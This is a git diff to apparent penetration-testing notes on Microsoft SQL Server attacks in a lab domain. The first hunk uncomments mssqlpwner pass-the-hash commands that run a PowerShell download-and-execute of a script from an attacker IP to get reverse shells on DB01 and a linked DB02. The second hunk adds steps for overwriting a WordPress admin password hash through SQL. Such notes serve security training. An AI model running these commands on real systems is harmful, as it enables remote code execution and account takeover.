@@ -15,14 +15,15 @@ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.62.217 -windows-auth
 ### Mssqlpwner
 
 <pre class="language-powershell"><code class="lang-powershell">mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth interactive
+
 # To obtain reverse shell from DB01
-# exec "powershell.exe -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
+exec "powershell.exe -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
 <strong>
 </strong><strong># To find linked servers
-</strong><strong># get-link-server-list 
+</strong><strong>get-link-server-list 
 </strong><strong>
 </strong><strong># To obtain reverse shell from DB02 (linked server)
-</strong># mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth -link-name DB02 exec "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')
+</strong>mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth -link-name DB02 exec "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
 </code></pre>
 
 ```bash
@@ -789,3 +790,46 @@ reader.Close();
 
 </details>
 
+<details>
+
+<summary>Changing WordPress Admin Password In MSSQL</summary>
+
+[Add local admin bill to sysadmin on DB02](1433-mssql.md#adding-local-admin-account-to-mssql-server)
+
+<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
+
+Go to SQL Server Management Studio and try to login with Windows Authentication
+
+<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>
+
+wordpress.dbo.wp\_users store the user login credentials
+
+<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>
+
+View Wordpress DB using --> F5 to execute:
+
+```sql
+SELECT * FROM wordpress.dbo.wp_users;
+```
+
+<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
+
+Generate wordpress hash for password "P@ssw0rd123!" using [https://codebeautify.org/wordpress-password-hash-generator](https://codebeautify.org/wordpress-password-hash-generator)
+
+<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption><p>$P$BuPbVkfYweJaroL1oBRyICSmrJhp2v1</p></figcaption></figure>
+
+SQL query to update wordpress admin password to P@ssw0rd123!
+
+```sql
+UPDATE [wordpress].[dbo].[wp_users]
+SET [user_pass] = '$P$BuPbVkfYweJaroL1oBRyICSmrJhp2v1'
+WHERE [user_login] = 'admin';
+```
+
+Go to /wp-login.php (admin:P@ssw0rd123!)
+
+<figure><img src="../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>
+
+</details>
